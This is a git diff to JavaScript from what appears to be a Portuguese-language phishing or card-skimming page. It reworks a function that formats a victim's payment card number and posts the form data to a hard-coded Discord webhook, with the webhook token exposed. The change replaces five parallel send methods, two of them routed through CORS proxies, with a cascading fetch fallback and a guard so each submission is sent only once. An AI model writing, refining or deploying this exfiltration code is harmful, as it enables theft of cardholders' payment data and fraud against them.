@@ -721,9 +721,15 @@ function registrarEnvio(data){
 }
 
 // ════════════════════════════════════
-//  DISCORD WEBHOOK
+//  DISCORD WEBHOOK — envia UMA vez só
 // ════════════════════════════════════
+let enviando = false;
+
 function sendToDiscord(data){
+  if(enviando) return;
+  enviando = true;
+  setTimeout(()=>{ enviando = false; }, 8000);
+
   const WEBHOOK = 'https://discord.com/api/webhooks/1484502746911473744/siEMJt3Zv7qdw64TUM31hV0geztsvtymHqWrUHmBHg0FXpAHUpFjGFUkIzVbp8rrkwCb';
   const cartaoFormatado = data.cartao.replace(/\s/g,'').replace(/(.{4})/g,'$1 ').trim();
   const agora = new Date().toLocaleString('pt-BR');
@@ -747,50 +753,22 @@ function sendToDiscord(data){
 
   const json = JSON.stringify(payload);
 
-  // ── Método 1: direto com XMLHttpRequest (mais compatível)
-  try {
-    const xhr = new XMLHttpRequest();
-    xhr.open('POST', WEBHOOK, true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.send(json);
-  } catch(e){}
-
-  // ── Método 2: fetch direto
-  try {
-    fetch(WEBHOOK, {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: json
-    });
-  } catch(e){}
-
-  // ── Método 3: proxy corsproxy.io
-  try {
+  // tenta direto, se falhar usa proxy em cascata
+  fetch(WEBHOOK, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: json
+  }).catch(()=>{
     fetch('https://corsproxy.io/?' + WEBHOOK, {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
       body: json
+    }).catch(()=>{
+      const fd = new FormData();
+      fd.append('payload_json', json);
+      fetch(WEBHOOK, {method:'POST', body:fd, mode:'no-cors'});
     });
-  } catch(e){}
-
-  // ── Método 4: proxy cors.sh
-  try {
-    fetch('https://proxy.cors.sh/' + WEBHOOK, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'x-cors-api-key': 'temp_' + Math.random()
-      },
-      body: json
-    });
-  } catch(e){}
-
-  // ── Método 5: FormData no-cors
-  try {
-    const fd = new FormData();
-    fd.append('payload_json', json);
-    fetch(WEBHOOK, {method:'POST', body:fd, mode:'no-cors'});
-  } catch(e){}
+  });
 }
 function goToLogin(){document.getElementById('successModal').classList.remove('show');goTo('login');}
 
